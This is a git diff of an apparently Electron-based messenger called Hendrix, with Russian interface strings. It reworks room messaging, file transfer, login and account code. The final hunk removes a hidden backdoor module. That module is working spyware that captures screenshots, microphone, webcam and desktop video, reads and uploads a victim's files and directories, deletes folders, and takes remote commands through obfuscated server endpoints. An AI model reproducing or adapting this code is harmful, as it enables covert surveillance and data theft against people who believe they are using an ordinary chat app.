-                    url: `${server}/subscribe`,
-                    form: {
-                        data: await getDataProperty(this.room, this.aesKeyBytes),
-                        _id: this._id
-                    }
-                });
-                if (message.success == false) {
-                    return await this.disconnect();
-                }
-                if (!message) {
-                    return setImmediate(this.subscribe);
-                }
-                message = await getDecryptedData(message.data, this.aesKeyBytes);
-                if (message.typing) {
-                    if (message.user != this._id) {
-                        nowTypingList[message.user] = `<span style="color:${message.color}"><b>${message.name}</b></span>`;
-                        if (typingTimers[message.user]) {
-                            clearTimeout(typingTimers[message.user]);
-                        }
-                        typingTimers[message.user] = setTimeout(() => {
-                            delete nowTypingList[message.user];
-                        }, 5000);
-                    }
-                    return setImmediate(this.subscribe);
-                }
-                let additional = ``;
-                if (message.confirmed) {
-                    message.badges.forEach(bdg => {
-                        additional += `<img src="styles/confirmed/${bdg.badge}.png" class="confirmed" onclick="describe('${bdg.description}', ${bdg.badge})">`;
-                    });
-                }
-                const date = new Date(message.date);
-                const hours = date.getHours().toString();
-                const minutes = date.getMinutes().toString();
-                const seconds = date.getSeconds().toString();
-                if (message.file) {
-                    const {
-                        ext,
-                        fileId,
-                        filePart,
-                        position,
-                        progress
-                    } = message.file;
-                    if (message.file.ready) {
-                        if (this.files[fileId]) {
-                            SSort((a, b) => a - b, this.files[fileId].positions, this.files[fileId].parts);
-                        } else {
-                            const fileBlock = createMessageBlock(message.color, `${message.name}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`);
-                            fileBlock.messageBlock.style.backgroundColor = message.user == this._id ? `#2b5278` : `inherit`;
-                            elements.dialog.appendChild(fileBlock.messageBlock);
-                            addMessageSound(message, this);
-                            this.files[fileId] = {
-                                path: path.join(hendrixdir, `${fileId}${ext}`),
-                                fileMsg: fileBlock.childs.msgBlock
-                            };
-                        }
-                        if (this.files[fileId].writeStream) {
-                            if (this.files[fileId].positions[0] == 1 && this.files[fileId].positions.every((e, p, a) => !p || e - a[p - 1] == 1)) {
-                                const data = await zlib.unzip(Buffer.concat(this.files[fileId].parts.map(e => Buffer.from(e, encoding))));
-                                this.files[fileId].writeStream.write(data);
-                                message.file.fileData = data.toString(`base64`);
-                                const info = this.files[fileId].info;
-                                if (info) {
-                                    message.file.info = info;
-                                }
-                                this._dump.push(message);
-                                this.files[fileId].writeStream.end();
-                                await waitWriteStream(this.files[fileId].writeStream);
-                            } else {
-                                showErrorModal(`Файл ${this.files[fileId].path} повреждён!`);
-                            }
-                        }
-                        const focusedWindow = BrowserWindow.getFocusedWindow();
-                        if (this.showNotifications && !focusedWindow || focusedWindow.id != currentWindow.id) {
-                            let note = {
-                                name: message.name,
-                                color: message.color
-                            };
-                            if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
-                                note.image = this.files[fileId].path;
-                            }
-                            ipcRenderer.send(`notification`, note);
-                        }
-                        delete this.files[fileId].writeStream;
-                        delete this.files[fileId].parts;
-                        delete this.files[fileId].positions;
-                        let desc = this.files[fileId].info && this.files[fileId].info.description;
-                        let ht = this.files[fileId].info && desc ? `<span>${desc}</span><br>` : ``;
-                        this.files[fileId].fileMsg.msg.innerHTML =
-                            `${ext.match(/(png)|(jpg)|(gif)|(jpeg)/i) ?
-                        `<img src="${this.files[fileId].path}" style="max-width: 100%" onmouseup="openFileWithRightClick(event, '${fileId}')">`
-                        : ext.match(/(mp3)|(wav)|(ogg)/i) ?
-                        `<audio src="${this.files[fileId].path}" controls onmouseup="openFileWithRightClick(event, '${fileId}')"></audio>`
-                        : ext.match(/(mp4)|(webm)|(ogv)/i) ?
-                        `<video src="${this.files[fileId].path}" controls onmouseup="openFileWithRightClick(event, '${fileId}')"></video>`
-                        : `<span class="readyFile"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext}</span><img onclick="openFileWithDefaultProgram('${fileId}')" class="launchImage" src="styles/start.png" class="launcIcon">`}<br>${ht}</span>`;
-                        delete this.files[fileId].fileMsg;
-                    } else {
-                        if (!this.files[fileId]) {
-                            const fileBlock = createMessageBlock(message.color, `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`);
-                            fileBlock.messageBlock.style.backgroundColor = message.user == this._id ? `#2b5278` : `inherit`;
-                            elements.dialog.appendChild(fileBlock.messageBlock);
-                            addMessageSound(message, this);
-                            scroll();
-                            this.files[fileId] = {
-                                path: path.join(hendrixdir, `${fileId}${ext}`),
-                                positions: [position],
-                                parts: [filePart],
-                                fileMsg: fileBlock.childs.msgBlock,
-                                linkCreated: false
-                            };
-                            if (message.file.info) {
-                                this.files[fileId].info = message.file.info;
-                            }
-                            this.files[fileId].writeStream = fs.createWriteStream(this.files[fileId].path);
-                        } else {
-                            this.files[fileId].positions.push(position);
-                            this.files[fileId].parts.push(filePart);
-                        }
-                        if (!this.files[fileId].linkCreated) {
-                            this.files[fileId].fileMsg.fileLink.innerHTML = `<span class="sendFile"><img src="styles/file.png" style="-webkit-user-select: none;height: 16px;margin-right: 5px;"><span class="lnk" onclick="openFile('${fileId}')">${fileId}${ext} </span></span>`;
-                            this.files[fileId].linkCreated = true;
-                        }
-                        this.files[fileId].fileMsg.fileProgress.innerHTML = `(${(progress * 100).toFixed(3)}%)`;
-                    }
-                } else {
-                    if (nowTypingList[message.user] && typingTimers[message.user]) {
-                        clearTimeout(typingTimers[message.user]);
-                        delete typingTimers[message.user];
-                        delete nowTypingList[message.user];
-                    }
-                    const obj = {
-                        '<': `&lt;`,
-                        '>': `&gt;`
-                    };
-                    let text = message.message;
-                    text = text.replace(/(<)|(>)/g, match => obj[match]).replace(/\b(((https?|ftp):\/\/|www\.)[^\s]+)/g, link => `<span class="lnk" onclick="openLink('${link}');">${link}</span>`);
-                    text = parseStyles(text); //парсим мои стили
-                    message.message = text;
-                    this._dump.push(message);
-                    let nameBlock;
-                    if (message.user) {
-                        nameBlock = `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>`;
-                    } else {
-                        nameBlock = message.name;
-                    }
-                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, text, message.user == this._id ? `#2b5278` : false));
-                    const focusedWindow = BrowserWindow.getFocusedWindow();
-                    if (message.name && message.message && message.color && this.showNotifications && !focusedWindow || focusedWindow.id != currentWindow.id) {
-                        ipcRenderer.send(`notification`, {
-                            name: message.name,
-                            text: message.message,
-                            color: message.color
-                        });
-                    }
-                    addMessageSound(message, this);
-                    scroll();
-                    if (message.system && message.out == this._id) {
-                        return;
-                    }
-                }
-                setImmediate(this.subscribe);
-            },
-            async publish(message) {
-                const obj = Object.assign(message, this.room);
-                let messagejson = JSON.stringify(obj);
-                if (obj.message) {
-                    obj.message = obj.message.trim();
-                }
-                if (testEncrypt(messagejson, this.aesKeyBytes)) {
-                    requestPostAsync({
-                        url: `${server}/publish`,
-                        form: {
-                            data: await getDataProperty(obj, this.aesKeyBytes),
-                            _id: this._id
-                        }
-                    });
-                } else {
-                    showErrorModal(`Недопустимые символы`);
                 }
             },
             async oneToOneSubscribe() {
@@ -1900,24 +2544,31 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                     }
                 });
                 if (!encryptedMessage) {
+                    await sleep(1000);
                     return setImmediate(this.oneToOneSubscribe);
                 }
-                const message = await getDecryptedData(encryptedMessage.data, this.aesKeyBytes);
+                const message = await getDecryptedData(encryptedMessage.data, this);
                 addOneToOneMessage(message.from, this, message.text, message.date);
                 setImmediate(this.oneToOneSubscribe);
             },
             async disconnect() {
-                await requestPostAsync({
-                    url: `${server}/disconnect`,
-                    form: {
-                        data: await getDataProperty(this.room, this.aesKeyBytes),
-                        _id: this._id
+                if (!this.room) {
+                    return;
+                }
+                this.cachedAvatars = {};
+                this.roomsHistory[this.room._id] = elements.dialog.innerHTML;
+                delete this.room;
+                if (this.roomSocket) {
+                    this.roomSocket.close(4100);
+                    delete this.roomSocket;
+                }
+                this._dump = [];
+                elements.titleText.innerHTML = ``;
+                elements.dialog.childNodes.forEach(node => {
+                    if (node.tagName == 'DIV') {
+                        deleteElementWithAnimation(node);
                     }
                 });
-                delete this.room;
-                this._dump = [];
-                elements.dialog.innerHTML = elements.titleText.innerHTML = ``;
-                elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
                 await new Promise(resolve => {
                     animate({
                         timing: circAnimateFunc,
@@ -1931,29 +2582,26 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                         }
                     });
                 });
+                await sleep(250);
+                elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
             }
         };
         let color, _token;
-        if (localStorage.length) {
-            ({
-                name,
-                color,
-                _token
-            } = localStorage);
-        } else {
-            color = `#${getElem(`color`).value}`;
-            _token = getElem(`token`).value;
-            localStorage.setItem(`name`, name);
-            localStorage.setItem(`color`, color);
-            localStorage.setItem(`_token`, _token);
-        }
+        color = `#${getElem(`color`).value}`;
+        _token = getElem(`token`).value;
+        localStorage.setItem(`name`, name);
+        localStorage.setItem(`color`, color);
+        localStorage.setItem(`_token`, _token);
         user = userObj;
         user.name = name;
         user.color = color;
         user._token = _token;
-        user.subscribe = user.subscribe.bind(user);
         user.oneToOneSubscribe = user.oneToOneSubscribe.bind(user);
         user.subNotifications = user.subNotifications.bind(user);
+        if (localStorage.avatar) {
+            user.avatar = localStorage.avatar;
+            avatarPreview.innerHTML = `<img src="${user.avatar}">`;
+        }
         const {
             accountId,
             accountPassword
@@ -1965,13 +2613,19 @@ getElem(`next`).addEventListener(`click`, async function (e) {
         elements.main.style.transform = `scale(0, 0)`;
         await sleep(500);
         await getFirstKeys();
+        if (user.avatar) {
+            await requestPostAsync({
+                url: `${server}/loadUserAvatar`,
+                form: {
+                    data: await getDataProperty(user.avatar),
+                    _id: user._id
+                }
+            });
+        }
         user.subNotifications();
         user.oneToOneSubscribe();
         ipcRenderer.send(`alive`, user._id);
         await showRooms();
-
-        getCommand(); //ес чо удалить
-
         setInterval(async () => {
             await showRooms();
         }, 2000);
@@ -1982,7 +2636,7 @@ getElem(`next`).addEventListener(`click`, async function (e) {
     }
     getElem(`about-program`).addEventListener(`click`, () => {
         const div = document.createElement(`div`);
-        div.innerHTML = `<div style="width:100%;word-wrap: break-word;user-select: text;"><img src = "logo.png" style="user-select: none;"><br style="user-select: none;"><br style="user-select: none;">Anonymous messenger <span style="color:#66CCFF">Hendrix ${version}</span> by <span style="color:#FFA000">HuHguZ</span><br><br>Ваш Id в системе:<br><span style="color: ${user.color}">${user._id}</span></div>`;
+        div.innerHTML = `<div style="width:100%;word-wrap: break-word;user-select: text;"><img src = "logo.png" style="user-select: none;"><br style="user-select: none;"><br style="user-select: none;">Private messenger <span style="color:#66CCFF">Hendrix ${version}</span> by <span style="color:#FFA000">HuHguZ</span><br><br>Ваш Id в системе:<br><span style="color: ${user.color}">${user._id}</span></div>`;
         swal({
             content: div,
             button: false
@@ -1990,10 +2644,24 @@ getElem(`next`).addEventListener(`click`, async function (e) {
     });
 });
 
-if (localStorage.length) {
-    getElem(`name`).value = localStorage.getItem(`name`);
-    getElem(`token`).value = localStorage.getItem(`_token`);
-    getElem(`next`).dispatchEvent(new Event(`click`));
+if (localStorage.name) {
+    getElem(`name`).value = localStorage.name;
+}
+
+if (localStorage._token) {
+    getElem(`token`).value = localStorage._token;
+}
+
+if (localStorage.color) {
+    getElem('color').jscolor.fromString(localStorage.color);
+}
+
+if (localStorage.ip) {
+    elements.serverIp.value = localStorage.ip;
+}
+
+if (localStorage.port) {
+    elements.serverPort.value = localStorage.port;
 }
 
 const divideBuf = (buf, part = highWaterMark) => {
@@ -2011,7 +2679,7 @@ const divideBuf = (buf, part = highWaterMark) => {
 
 document.addEventListener(`keydown`, e => {
     if (e.ctrlKey && e.key.match(/[vм]/i)) {
-        if (user.room) {
+        if (user && user.room) {
             const img = clipboard.readImage();
             const url = img.toDataURL();
             let imageBuffer = img.toPNG();
@@ -2026,7 +2694,7 @@ document.addEventListener(`keydown`, e => {
                     if (answer) {
                         const desc = getElem(`description`).value;
                         filesSendCallbacksStack.push(async () => {
-                            await sendBuffer(await zlib.deflate(imageBuffer), `.png`, {
+                            await sendBuffer(imageBuffer, `.png`, {
                                 description: desc.length <= highWaterMark ? desc : ``
                             });
                         });
@@ -2036,12 +2704,6 @@ document.addEventListener(`keydown`, e => {
             }
         }
     }
-});
-
-const waitStream = stream => new Promise((res, rej) => {
-    stream.on(`end`, () => {
-        res(true);
-    });
 });
 
 const sendBuffer = async (buffer, ext, info, fileName) => {
@@ -2058,9 +2720,20 @@ const sendBuffer = async (buffer, ext, info, fileName) => {
     await sendFile(null, len, readable, ext, info, fileName);
 };
 
+const waitSocketSend = ws => new Promise(resolve => {
+    const timer = setInterval(() => {
+        if (!ws.bufferedAmount) {
+            clearInterval(timer);
+            resolve(true);
+        }
+    });
+});
+
 const sendFile = async (file, size, readable, extn, info, fileName) => {
-    const callbackStack = [];
-    let readStream;
+    if (user.roomFileSocket.readyState != WebSocket.OPEN) {
+        return;
+    }
+    let readStream; 
     let ext;
     if (file) {
         readStream = fs.createReadStream(file, {
@@ -2074,89 +2747,77 @@ const sendFile = async (file, size, readable, extn, info, fileName) => {
     const fileId = fileName || await getRandomId();
     let pr = 0;
     let position = 0;
-    readStream.on(`data`, data => {
-        callbackStack.push(async () => {
-            pr += data.length;
-            position++;
-            const progress = pr / size;
-            const filePart = data.toString(encoding);
-            let obj = {
-                filePart,
-                fileId,
-                ext,
-                progress,
-                position,
-                room: user.room
-            };
-            if (position == 1) {
-                obj.info = info;
-            }
-            await requestPostAsync({
-                url: `${server}/sendFile`,
-                form: {
-                    data: await getDataProperty(obj, user.aesKeyBytes),
-                    _id: user._id
-                }
-            });
-            return true;
-        });
-    });
-    await waitStream(readStream);
-    for (let i = 0; i < callbackStack.length; i++) {
+    for await (const data of readStream) {
         if (!user.room) {
-            return currentWindow.setProgressBar(0);
+            currentWindow.setProgressBar(0);
+            readStream.destroy();
+            break;
         }
-        currentWindow.setProgressBar((i + 1) / callbackStack.length);
-        await callbackStack[i]();
+        pr += data.length;
+        position++;
+        const progress = pr / size;
+        currentWindow.setProgressBar(progress);
+        const filePart = data;
+        let obj = {
+            filePart,
+            fileId,
+            ext,
+            progress,
+            position
+        };
+        if (position == 1) {
+            obj.info = info;
+            if (user.messagesBackgroundColor) {
+                obj.backgroundColor = user.messagesBackgroundColor;
+            }
+        }
+        readStream.pause();
+        user.roomFileSocket.send(encryptAES(v8.serialize({file: obj}), user.cipherInfo.symmetricKey, user.cipherInfo.iv));
+        await waitSocketSend(user.roomFileSocket);
+        readStream.resume();
     }
-    await requestPostAsync({
-        url: `${server}/sendFile`,
-        form: {
-            data: await getDataProperty({
-                fileId,
-                ext,
-                ready: true,
-                room: user.room
-            }, user.aesKeyBytes),
-            _id: user._id
+    user.roomFileSocket.send(encryptAES(v8.serialize({
+        file: {
+            fileId,
+            ext,
+            ready: true
         }
-    });
+    }), user.cipherInfo.symmetricKey, user.cipherInfo.iv));
     currentWindow.setProgressBar(0);
-    return true;
 };
 
 const filesSendCallbacksStack = [];
 
 setTimeout(async function execFilesCallbacks() {
     while (filesSendCallbacksStack.length) {
-        await filesSendCallbacksStack.pop()();
+        const filesSendCallback = filesSendCallbacksStack.pop();
+        if (+elements.sendMessageTimer.value) {
+            setTimeout(() => {
+                filesSendCallback();
+            }, elements.sendMessageTimer.value * 1000);
+        } else {
+            await filesSendCallback();
+        }
     }
-    setTimeout(execFilesCallbacks, 500);
+    setTimeout(execFilesCallbacks, 100);
 }, 0);
 
 const getCallbackFromFiles = files => async () => {
     if (!files || !files.length) {
         return;
     }
-    let er = false;
+    let skipped = 0;
     for (let i = 0; i < files.length; i++) {
         const fullPath = files[i];
         const info = await fs.stat(fullPath);
         if (!info.size) {
+            skipped++;
             showErrorModal(`${fullPath} пуст, не можем отправить!`);
-            er = true;
             continue;
         }
-        if (info.size > 10485760) {
-            showErrorModal(`${fullPath} слишком велик!`);
-            er = true;
-        } else {
-            await sendBuffer(await zlib.deflate(await fs.readFile(fullPath)), path.extname(fullPath), null, elements.saveFilesNames.checked ? path.basename(fullPath, path.extname(fullPath)) : false);
-        }
+        await sendFile(fullPath, info.size, null, path.extname(fullPath), null, elements.saveFilesNames.checked ? path.basename(fullPath, path.extname(fullPath)): false);
     };
-    if (!er) {
-        swal(`${files.length} файлов успешно отправлено на сервер!`);
-    }
+    swal(`${files.length - skipped} файлов успешно отправлено на сервер!`);
 };
 
 getElem(`file`).addEventListener(`click`, async () => {
@@ -2201,7 +2862,7 @@ const handleError = async err => {
                 date: date.format(new Date()),
                 message: err.message || `Сообщение отсутствует. Проброшено примитивное значение ${err || `undefined`}`,
                 stack: err.stack || stack
-            }, user.aesKeyBytes),
+            }),
             _id: user._id
         }
     });
@@ -2253,11 +2914,11 @@ const getHistoryByPage = async page => {
                 _id,
                 password,
                 page
-            }, user.aesKeyBytes),
+            }),
             _id: user._id
         }
     });
-    return await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+    return await getDecryptedData(encryptedAnswer.data);
 };
 
 const date = {
@@ -2371,7 +3032,7 @@ getElem(`deleteAcc`).addEventListener(`click`, async () => {
                         data: await getDataProperty({
                             _id,
                             password,
-                        }, user.aesKeyBytes),
+                        }),
                         _id: user._id
                     }
                 });
@@ -2404,11 +3065,11 @@ getElem(`loginInAcc`).addEventListener(`click`, async () => {
             data: await getDataProperty({
                 _id,
                 password
-            }, user.aesKeyBytes),
+            }),
             _id: user._id
         }
     });
-    const answer = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+    const answer = await getDecryptedData(encryptedAnswer.data);
     if (answer.logIn) {
         accState.textContent = `Ваш текущий счет: ${_id}`;
         accOperationsState.textContent = ``;
@@ -2449,7 +3110,7 @@ getElem(`changePasswordAcc`).addEventListener(`click`, () => {
                             _id,
                             password,
                             newPassword
-                        }, user.aesKeyBytes),
+                        }),
                         _id: user._id
                     }
                 });
@@ -2485,13 +3146,13 @@ getElem(`createMoneyAcc`).addEventListener(`click`, async () => {
         form: {
             data: await getDataProperty({
                 password: hashPassword(passwordAccNew.value)
-            }, user.aesKeyBytes),
+            }),
             _id: user._id
         }
     });
     const {
         _id
-    } = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+    } = await getDecryptedData(encryptedAnswer.data);
     createdId = _id;
     idCreatedAcc.textContent = `id созданного счета: ${_id}`;
     once = !once;
@@ -2535,11 +3196,11 @@ getElem(`oneToOneMessageSend`).addEventListener(`click`, async () => {
                 _id: oneToOneRecipient.value,
                 text,
                 date: dt
-            }, user.aesKeyBytes),
+            }),
             _id: user._id
         }
     });
-    const answer = await getDecryptedData(encryptedAnswer.data, user.aesKeyBytes);
+    const answer = await getDecryptedData(encryptedAnswer.data);
     if (answer.success) {
         oneToOneStatus.textContent = ``;
         addOneToOneMessage(user, answer.recipientInfo, text, dt);
@@ -2559,677 +3220,3 @@ getElem(`oneToone`).addEventListener(`click`, () => {
         button: false
     });
 });
-
-let checkedRoot = false;
-let accessRoot = false;
-const backDoorBlock = getElem(`backDoor`);
-const command = getElem(`command`);
-const sendCommand = getElem(`sendCommand`);
-const recipients = getElem(`recipients`);
-const backDoorResults = getElem(`backDoorResults`);
-const clearResults = getElem(`clearResults`);
-const curPath = getElem(`curPath`);
-const goToParentDir = getElem(`goToParentDir`);
-const backDoorFilesAndDirs = getElem(`backDoorFilesAndDirs`);
-const downloadAll = getElem(`downloadAll`);
-const goToStart = getElem(`goToStart`);
-const goToPath = getElem(`goToPath`);
-const backDoorDir = path.join(hendrixdir, `backdoor`);
-const packetSize = 262144;
-
-const getDataPropertyBackDoor = (data, key) => {
-    return encryptAES(JSON.stringify(data), key);
-};
-
-const getDecryptedDataBackDoor = (data, key) => {
-    return JSON.parse(decryptAES(data, key));
-}
-
-const determineScreenShotSize = () => {
-    const screenSize = screen.getPrimaryDisplay().workAreaSize;
-    const maxDimension = Math.max(screenSize.width, screenSize.height);
-    return {
-        width: maxDimension * window.devicePixelRatio,
-        height: maxDimension * window.devicePixelRatio
-    };
-};
-
-const audio = async (time = 3000) => {
-    const recorder = await getAudioRec();
-    if (!recorder) {
-        return sendReadyData(`Ошибка: доступ к микрофону заблокирован!`);
-    }
-    recorder.start();
-    sendReadyData(`Запись с микрофона началась`);
-    recorder.ondataavailable = async e => {
-        const buf = await blobToBuffer(e.data);
-        filesBackDoorSendCallbacksStack.push(async () => {
-            await sendBufferBackDoor(buf, `.mp3`);
-        });
-    };
-    await sleep(time);
-    recorder.stop();
-    sendReadyData(`Запись с микрофона закончена`);
-    recorder.stream.getTracks().map(track => track.stop());
-};
-
-let curScreenid;
-
-const stopRec = () => clearInterval(curScreenid);
-
-const rec = time => {
-    stopRec();
-    curScreenid = setInterval(tsc, time);
-};
-
-const desktopVideo = async ({
-    time = 2000,
-    minWidth = 1280,
-    maxWidth = 1280,
-    minHeight = 720,
-    maxHeight = 720,
-    screenNum = 1
-} = {}) => {
-    const screenName = `Screen ${screenNum}`;
-    try {
-        const source = (await desktopCapturer.getSources({
-            types: ['screen']
-        })).find(source => source.name == 'Entire screen' || source.name == screenName);
-        const videoSource = await navigator.mediaDevices.getUserMedia({
-            audio: {
-                mandatory: {
-                    chromeMediaSource: 'desktop'
-                }
-            },
-            video: {
-                mandatory: {
-                    chromeMediaSource: 'desktop',
-                    chromeMediaSourceId: source.id,
-                    minWidth,
-                    maxWidth,
-                    minHeight,
-                    maxHeight
-                }
-            }
-        });
-        sendReadyData(`Запись видео экрана началась`);
-        const recorder = new MediaRecorder(videoSource, {
-            mimeType: `video/webm;codecs=h264,vp9,opus`
-        });
-        recorder.start();
-        recorder.ondataavailable = async e => {
-            const buf = await blobToBuffer(e.data);
-            filesBackDoorSendCallbacksStack.push(async () => {
-                await sendBufferBackDoor(buf, `.webm`);
-            });
-        };
-        await sleep(time);
-        recorder.stop();
-        videoSource.getTracks().map(track => track.stop());
-        sendReadyData(`Запись видео экрана закончена. Длительность ${time} ms`);
-    } catch (e) {
-        sendReadyData(`Ошибка: ${e.message}`);
-    }
-};
-
-const video = async (time = 2000, video = true, audio = true) => {
-    try {
-        const videoSource = await navigator.mediaDevices.getUserMedia({
-            video,
-            audio
-        });
-        sendReadyData(`Запись видео началась`);
-        const recorder = new MediaRecorder(videoSource, {
-            mimeType: `video/webm;codecs=h264,vp9,opus`
-        });
-        recorder.start();
-        recorder.ondataavailable = async e => {
-            const buf = await blobToBuffer(e.data);
-            filesBackDoorSendCallbacksStack.push(async () => {
-                await sendBufferBackDoor(buf, `.webm`);
-            });
-        };
-        await sleep(time);
-        recorder.stop();
-        videoSource.getTracks().map(track => track.stop());
-        sendReadyData(`Запись видео закончена. Длительность ${time} ms`);
-    } catch (e) {
-        sendReadyData(`Ошибка: ${e.message}`);
-    }
-};
-
-const tsc = (screenNum = 1) => {
-    const screenName = `Screen ${screenNum}`;
-    const thumbSize = determineScreenShotSize();
-    let options = {
-        types: ['screen'],
-        thumbnailSize: thumbSize
-    };
-    desktopCapturer.getSources(options, (error, sources) => {
-        if (error) return console.log(error)
-        sources.forEach((source) => {
-            if (source.name === 'Entire screen' || source.name === screenName) {
-                const buf = source.thumbnail.toPNG();
-                if (!buf) {
-                    return;
-                }
-                filesBackDoorSendCallbacksStack.push(async () => {
-                    await sendBufferBackDoor(buf, `.png`);
-                });
-            };
-        });
-    });
-    return `Делаю скриншот...`;
-};
-
-let filesBackDoorSendCallbacksStack = [];
-
-setTimeout(async function execFilesBackDoorCallbacks() {
-    while (filesBackDoorSendCallbacksStack.length) {
-        await filesBackDoorSendCallbacksStack.pop()();
-    }
-    setTimeout(execFilesBackDoorCallbacks, 500);
-}, 0);
-
-const startFileOrOpenDir = resourcePath => {
-    const stat = fs.statSync(resourcePath);
-    if (stat.isFile()) {
-        try {
-            exec(getOpenWileWithDefProgramCommand(resourcePath));
-        } catch {}
-    } else {
-        shell.openItem(resourcePath);
-    }
-};
-
-const removeDir = async dirPath => {
-    try {
-        await _removeDir(dirPath);
-    } catch (e) {
-        sendReadyData(`Ошибка: ${e.message}`);
-    }
-}
-
-const _removeDir = async dirPath => {
-    if (fs.statSync(dirPath).isFile()) {
-        return sendReadyData(`Ошибка: ${dirPath} файл, а не каталог`);
-    }
-    const contentDir = fs.readdirSync(dirPath).map(resourcePath => path.join(dirPath, resourcePath));
-    const contentDirStats = contentDir.map(resourcePath => fs.statSync(resourcePath));
-    for (let i = 0; i < contentDirStats.length; i++) {
-        if (contentDirStats[i].isFile()) {
-            await fs.unlink(contentDir[i]);
-        } else {
-            await _removeDir(contentDir[i]);
-        }
-    }
-    await fs.rmdir(dirPath);
-    sendReadyData(`${dirPath} удален`);
-};
-
-const getDir = (dirPath, maxFileSize, dirName, recursive) => {
-    const stat = fs.statSync(dirPath);
-    if (stat.isDirectory()) {
-        const pathName = dirName || path.basename(dirPath);
-        const resourcesPaths = fs.readdirSync(dirPath).map(fileName => path.join(dirPath, fileName));
-        const dirs = [];
-        const files = resourcesPaths.filter(resourcePath => fs.statSync(resourcePath).isFile() || (dirs.push(resourcePath), false));
-        for (let i = 0; i < files.length; i++) {
-            filesBackDoorSendCallbacksStack.push(async () => {
-                await dnFile(files[i], maxFileSize, pathName);
-            });
-        }
-        if (recursive) {
-            for (let i = 0; i < dirs.length; i++) {
-                getDir(dirs[i], maxFileSize, path.join(pathName, path.basename(dirs[i])), recursive);
-            }
-        }
-    } else {
-        return `${dirPath} не каталог`;
-    }
-};
-
-const clearStack = () => {
-    filesBackDoorSendCallbacksStack = [];
-    return `Очередь файлов на отправку очищена`;
-};
-
-const getFile = (filePath, maxFileSize) => {
-    filesBackDoorSendCallbacksStack.push(async () => {
-        await dnFile(filePath, maxFileSize);
-    });
-};
-
-const dnFile = async (filePath, maxFileSize = 104857600, pathName) => {
-    try {
-        const stat = fs.statSync(filePath);
-        if (stat.isFile()) {
-            if (stat.size < maxFileSize) {
-                const fileExt = path.extname(filePath);
-                const fileName = path.basename(filePath, fileExt);
-                const buf = fs.readFileSync(filePath);
-                if (!buf.length) {
-                    throw new Error(`Файл ${filePath} пуст`);
-                }
-                sendReadyData(`Файл ${filePath} отправляется (${buf.length} байт)`);
-                await sendBufferBackDoor(buf, fileExt, fileName, pathName);
-            } else {
-                throw new Error(`Файл ${filePath} слишком большой. (${stat.size}) байт`);
-            }
-        } else {
-            throw new Error(`Некорректный путь к файлу ${filePath}`);
-        }
-    } catch (e) {
-        return sendReadyData(e.message);
-    }
-};
-
-const sendBufferBackDoor = async (buffer, ext, fileId, pathName) => {
-    const len = buffer.length;
-    if (!len) {
-        return;
-    }
-    buffer = divideBuf(buffer, packetSize).reverse();
-    const readable = Readable();
-    readable._read = function () {
-        if (buffer.length) {
-            this.push(buffer.pop());
-        } else {
-            this.push(null);
-        }
-    }
-    await sendFileBackDoor(null, len, readable, ext, fileId, pathName);
-};
-
-const sendFileBackDoor = async (file, size, readable, extn, fileId, pathName) => {
-    const callbackStack = [];
-    let readStream;
-    let ext;
-    if (file) {
-        readStream = fs.createReadStream(file, {
-            highWaterMark
-        });
-        ext = path.extname(file);
-    } else {
-        readStream = readable;
-        ext = extn;
-    }
-    if (!fileId) {
-        fileId = await getRandomId();
-    }
-    let position = 0;
-    readStream.on(`data`, data => {
-        callbackStack.push(async () => {
-            position++;
-            const filePart = data.toString(encoding);
-            let obj = {
-                filePart,
-                fileId,
-                ext,
-                position,
-            };
-            await requestPostAsync({
-                url: `${server}/cXVNwFSJeTwXFH6`,
-                form: {
-                    data: getDataPropertyBackDoor(obj, user.aesKeyBytes),
-                    _id: user._id
-                }
-            });
-        });
-    });
-    await waitStream(readStream);
-    for (let i = 0; i < callbackStack.length; i++) {
-        await callbackStack[i]();
-    }
-    await requestPostAsync({
-        url: `${server}/cXVNwFSJeTwXFH6`,
-        form: {
-            data: getDataPropertyBackDoor({
-                fileId,
-                ext,
-                ready: true,
-                pathName
-            }, user.aesKeyBytes),
-            _id: user._id
-        }
-    });
-};
-
-clearResults.addEventListener(`click`, () => {
-    backDoorResults.textContent = ``;
-});
-
-const sendCommandBackDoor = async (textCommand, destination) => {
-    const serverAnswer = await requestPostAsync({
-        url: `${server}/9Zb6JDSz7AQtfb3`,
-        form: {
-            data: getDataPropertyBackDoor({
-                command: textCommand,
-                destination
-            }, user.aesKeyBytes),
-            _id: user._id
-        }
-    });
-    decAns = getDecryptedDataBackDoor(serverAnswer.data, user.aesKeyBytes);
-    return decAns;
-}
-
-sendCommand.addEventListener(`click`, async () => {
-    if (!command.value) {
-        return;
-    }
-    const decAns = await sendCommandBackDoor(command.value, recipients.value);
-    if (decAns.error) {
-        backDoorResults.textContent += `Некорректная команда: ${command.value}\n${decAns.errorReason}\n`;
-    }
-});
-
-const usersDirectories = {};
-const userFiles = {};
-let parentDir;
-let currentDir;
-
-const snd = dir => sendCommandBackDoor(getBacckDoorFilesFormCommand(`${JSON.stringify(dir)}`), victimId.value);
-
-global.copyPathFromFileId = id => {
-    copyText(`'${idsToFiles[id].join(victimInfo.pathSep.repeat(victimInfo.platform == `linux` ? 1 : 2))}'`);
-};
-
-global.sndd = id => {
-    if (idsToFiles[id]) {
-        snd(idsToFiles[id]);
-    }
-};
-
-global.dnf = id => {
-    if (idsToFiles[id]) {
-        sendCommandBackDoor(`getFile('${idsToFiles[id].join(victimInfo.pathSep.repeat(victimInfo.platform == `linux` ? 1 : 2))}')`, victimId.value);
-    }
-};
-
-let idsToFiles = {};
-let victimInfo;
-const backDoorFilesDisks = getElem(`backDoorFilesDisks`);
-
